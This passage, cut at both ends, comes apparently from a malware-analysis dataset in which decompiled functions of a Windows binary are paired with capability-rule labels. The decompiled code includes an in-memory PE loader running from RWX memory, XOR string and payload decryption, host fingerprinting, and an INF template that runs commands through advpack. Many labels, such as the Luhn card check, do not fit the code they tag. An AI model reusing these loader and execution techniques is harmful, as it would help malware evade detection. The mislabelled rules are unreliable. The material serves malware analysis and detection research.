= 0x614f427a;\n    var_ch._0_1_ = 0x66;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_8h = &var_48h - iVar5;\n    do {\n        puVar1 = iVar9 + iVar5;\n        iVar8 = iVar9 % var_4h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_13h + iVar8 + 3) ^ puVar1[&var_48h - iVar5];\n    } while (iVar9 < 0x36);\n    uVar6 = fcn.0040bf29();\n    puVar7 = uVar6 % 0x38 + 8;\n    unique0x10000100 = puVar7;\n    if (puVar7 != NULL) {\n        var_8h = puVar7 * 2 + 2;\n        uVar4 = (*pcVar2)(8, var_8h);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        puVar3 = stack0xffffffec;\n        if (puVar7 != NULL) {\n            var_4h = NULL;\n            puVar10 = puVar7;\n            for (iVar9 = var_8h; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            if (stack0xffffffec != NULL) {\n                do {\n                    iVar9 = fcn.0040bf29();\n                    *(puVar7 + var_4h * 2) = *(iVar5 + (iVar9 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < puVar3);\n            }\n            *(puVar7 + puVar3 * 2) = 0;\n        }\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return puVar7;\n}\n",
        "token_count": 986
    },
    "004060be": {
        "rules": [
            "contain obfuscated stackstrings",
            "create or open registry key",
            "contain loop",
            "set registry value",
            "get hostname",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004060be(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x410a2c;\n    uStack104 = *0x410a28;\n    uStack108 = *0x410a24;\n    name = *0x410a20;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41ccdc;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x410a30;\n    uStack92 = *0x410a34;\n    uStack88 = *0x410a38;\n    uStack84 = *0x410a3c;\n    var_3ch = *0x410a10;\n    uStack60 = *0x410a14;\n    uStack56 = *0x410a18;\n    uStack52 = *0x410a1c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(hKey);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x41cce4 = uVar10 ^ uVar8;\n        *0x41cce8 = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41ccdc = uVar8;\n        *0x41cce0 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1704
    },
    "00401b18": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401b18(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint noname_0;\n    uchar *puVar4;\n    uchar *puStack52;\n    uchar auStack36 [12];\n    uchar auStack24 [8];\n    uchar auStack16 [12];\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    puVar4 = auStack24;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = auStack16;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puStack52 = auStack36;\n    iVar3 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.QGFF__, 0x184, 0x40);\n    if (iVar3 != 0) {\n        fcn.00407c2c();\n        (*pcVar1)(str.QGFF__, 0x184, puStack52, &puStack52);\n    }\n    do {\n        do {\n            do {\n                cVar2 = fcn.0040e1a9();\n            } while (cVar2 == '\\0');\n            iVar3 = fcn.00405172(0);\n        } while (iVar3 == 0);\n        puStack52 = NULL;\n        fcn.00407fc3();\n        fcn.0040bc39(noname_0, &stack0xffffffd0, &puStack52);\n        (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n    } while( true );\n}\n",
        "token_count": 416
    },
    "0040bc39": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040bc39(uint noname_0, uint *arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uchar *puVar2;\n    int16_t *in_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uint uVar8;\n    uchar *puVar9;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar8 = 0;\n    if (((*in_ECX == 0x5a4d) && (piVar5 = *(in_ECX + 0x1e) + in_ECX,  *piVar5 == 0x4550)) &&\n       (puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, piVar5[0x14], 0x3000, 0x40),  puVar2 != NULL)) {\n        uVar1 = *(piVar5 + 5);\n        piVar6 = in_ECX;\n        puVar7 = puVar2;\n        for (iVar3 = piVar5[0x15]; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = *piVar6;\n            piVar6 = piVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        var_8h = 0;\n        if (*(piVar5 + 6) != 0) {\n            piVar4 = uVar1 + 0x2c + piVar5;\n            do {\n                puVar7 = *piVar4 + in_ECX;\n                puVar9 = puVar2 + piVar4[-2];\n                for (iVar3 = piVar4[-1]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    puVar9 = puVar9 + 1;\n                }\n                var_8h = var_8h + 1;\n                piVar4 = piVar4 + 10;\n            } while (var_8h < *(piVar5 + 6));\n        }\n        uVar8 = 0;\n        iVar3 = fcn.0040bb9c();\n        if ((iVar3 == 0) || (iVar3 = fcn.0040bd2f(),  iVar3 == 0)) {\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, piVar5[0x14], 0x4000);\n        }\n        else {\n            if (puVar2 + piVar5[10] != NULL) {\n                (*(puVar2 + piVar5[10]))(puVar2, 1, 0);\n            }\n            iVar3 = piVar5[0x14];\n            uVar8 = 1;\n            *arg_ch = puVar2;\n            *arg_10h = iVar3;\n        }\n    }\n    return uVar8;\n}\n",
        "token_count": 708
    },
    "0040447e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040447e(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x412010;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x416410;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.004014d4();\n        if (iVar3 != 0) {\n            iVar3 = fcn.004014d4();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.0040ee79(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 548
    },
    "00406aea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406aea(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int16_t *in_ECX;\n    int16_t *piVar9;\n    char **in_EDX;\n    int16_t *piVar10;\n    uint uVar11;\n    int16_t *piVar12;\n    char *pcVar13;\n    uint var_ch;\n    uint var_8h;\n    uint lpWideCharStr;\n    \n    uVar11 = 0;\n    piVar5 = fcn.0040bdeb();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (piVar5 != NULL) {\n        piVar10 = piVar5;\n        do {\n            iVar3 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar3 != 0);\n        piVar9 = piVar5;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        piVar12 = in_ECX;\n        do {\n            iVar3 = *piVar12;\n            piVar12 = piVar12 + 1;\n        } while (iVar3 != 0);\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar12 - (in_ECX + 1) >> 1) + (piVar9 - (piVar5 + 1) >> 1) +\n                               (piVar10 - (piVar5 + 1) >> 1)) * 2 + 0x140);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar6, \n                   L\"[Version]\\r\\nsignature = \\\"$CHICAGO$\\\"\\r\\nAdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\\r\\n\\r\\n[DefaultInstall]\\r\\nRunPreSetupCommands = %s:2\\r\\n\\r\\n[%s]\\r\\n%s\\r\\n\"\n                   , piVar5, piVar5, in_ECX);\n        if (iVar6 == 0) {\n            pcVar13 = NULL;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar6);\n            iVar7 = iVar7 * 2 + 2;\n            uVar11 = (*pcVar4)(8, iVar7);\n            pcVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            *pcVar13 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, iVar6, 0xffffffff, pcVar13, iVar7, 0, 0);\n        }\n        pcVar1 = pcVar13 + 1;\n        *in_EDX = pcVar13;\n        do {\n            cVar2 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar2 != '\\0');\n        *arg_8h = pcVar13 - pcVar1;\n        uVar11 = 1;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar11;\n}\n",
        "token_count": 804
    },
    "00407bd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00407bd8(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 268
    },
    "00407c2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00407c2c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 499
    },
    "004092a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004092a0(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 424
    },
    "00409859": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00409859(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(*0x41ccc0);\n    iVar4 = fcn.00406047();\n    iVar7 = -0x43ec94ba;\n    var_28h = 0xd84a20ac;\n    iVar6 = 0;\n    var_24h = 0xeed889c4;\n    var_20h = 0x58636143;\n    piVar1 = piVar3 + 1;\n    var_1ch = 0xc0f26006;\n    var_18h = 0x8606bedd;\n    var_14h = 0xe8cbab78;\n    var_10h = 0x2ab6e04a;\n    var_ch = 0x31e6d1ea;\n    var_8h = 0;\n    do {\n        iVar2 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 != 0);\n    if (piVar3 - piVar1 >> 1 < 0x20) {\n        do {\n            if (iVar4 == iVar7) goto code_r0x004098e9;\n            iVar7 = (&var_28h)[iVar6];\n            iVar6 = iVar6 + 1;\n        } while (iVar7 != 0);\n        uVar5 = 0;\n    }\n    else {\ncode_r0x004098e9:\n        uVar5 = 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 469
    },
    "0040bb9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040bb9c(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar6 = *(param_1[0xf] + 0x80 + param_1) + param_1;\n    if (piVar6 != param_1) {\n        for (; piVar6[3] != 0; piVar6 = piVar6 + 5) {\n            iVar1 = piVar6[3] + param_1;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar1);\n            if ((iVar2 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar1),  iVar2 == 0)) {\n                return 0;\n            }\n            puVar5 = piVar6[4] + param_1;\n            puVar4 = puVar5;\n            if (*piVar6 != 0) {\n                puVar4 = *piVar6 + param_1;\n            }\n            while( true ) {\n                uVar3 = *puVar4;\n                if (uVar3 == 0) break;\n                if (uVar3 < 0) {\n                    uVar3 = uVar3 & 0xffff;\n                }\n                else {\n                    uVar3 = uVar3 + 2 + param_1;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, uVar3);\n                *puVar5 = uVar3;\n                if (uVar3 == 0) {\n                    return 0;\n                }\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 443
    },
    "0040c58c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.0040c58c(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41cd60), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41cd60));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 115
    },
    "0040d58b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d58b(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 117
    },
    "0040d5aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d5aa(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.0040d58b();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 356
    },
    "0040d630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d630(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "0040e667": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pDacl\n\nbool fcn.0040e667(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint *puVar3;\n    uchar auStack65616 [65500];\n    uint uStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint *puStack88;\n    uint uStack84;\n    uint *var_38h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint *puStack44;\n    uint *lpbDaclDefaulted;\n    uint *pAclInformation;\n    uint *uBytes;\n    uint uStack28;\n    int32_t lpbDaclPresent;\n    uint lpcbSecurityDescriptor;\n    uint pSecurityDescriptor;\n    uint *pAceList;\n    uint pDacl;\n    \n    pDacl = 0x40e674;\n    sub.ntdll.dll__chkstk();\n    pAceList = &fcn.0040e667::lpcbSecurityDescriptor;\n    lpcbSecurityDescriptor = 4;\n    uStack28 = 0x40e695;\n    lpbDaclPresent = extraout_ECX;\n    pDacl = unaff_EBX;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegGetKeySecurity)();\n    if (iVar1 == 0) {\n        uStack28 = 1;\n        uBytes = &fcn.0040e667::var_38h;\n        pAclInformation = 0x40e6ac;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)();\n        if (iVar1 != 0) {\n            pAclInformation = &fcn.0040e667::lpbDaclDefaulted;\n            lpbDaclDefaulted = &fcn.0040e667::pDacl;\n            puStack44 = &fcn.0040e667::lpbDaclPresent;\n            puStack48 = &stack0xfffeffb0;\n            uStack52 = 0x40e6c9;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_GetSecurityDescriptorDacl)();\n            if (iVar1 != 0) {\n                uStack52 = 2;\n                uStack56 = 0xc;\n                var_38h = &fcn.0040e667::pAclInformation;\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetAclInformation)();\n                if (iVar1 != 0) {\n                    puStack88 = uBytes + 4;\n                    uStack84 = 0x40e6f3;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n                    uStack84 = 2;\n                    puStack96 = 0x40e6ff;\n                    uStack92 = uVar2;\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeAcl)();\n                    if (iVar1 != 0) {\n                        if ((lpbDaclPresent != 0) && (pAclInformation != NULL)) {\n                            puVar3 = NULL;\n                            do {\n                                puStack96 = &fcn.0040e667::pAceList;\n                                uStack104 = pDacl;\n                                